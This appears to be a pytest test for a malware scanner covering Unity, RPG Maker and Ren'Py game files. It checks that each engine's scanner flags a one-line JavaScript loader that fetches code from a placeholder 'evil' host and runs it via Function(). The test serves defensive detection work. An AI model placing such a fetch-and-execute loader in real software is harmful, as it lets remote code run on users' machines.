from pathlib import Path

from Virus_Scan.scanners.renpy import scan_renpy_file
from Virus_Scan.scanners.rpgm import scan_rpgm_file
from Virus_Scan.scanners.unity import scan_unity_file


def test_remote_fetch_to_dynamic_function_chain_is_engine_agnostic(tmp_path: Path):
    scanners = [
        (scan_unity_file, 'unity/Assembly-CSharp.cs'),
        (scan_rpgm_file, 'rpgm/www/js/plugins/stage.js'),
        (scan_renpy_file, 'renpy/game/script.rpy'),
    ]
    text = 'fetch("http://evil/stage.js").then(r=>r.text()).then(t=>Function(t)());'
    for scanner, rel in scanners:
        p = tmp_path / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text, encoding='utf-8')
        tags = set(scanner(str(p)))
        assert {'remote_payload_download', 'payload_execution', 'remote_eval_loader'} & tags, (rel, tags)
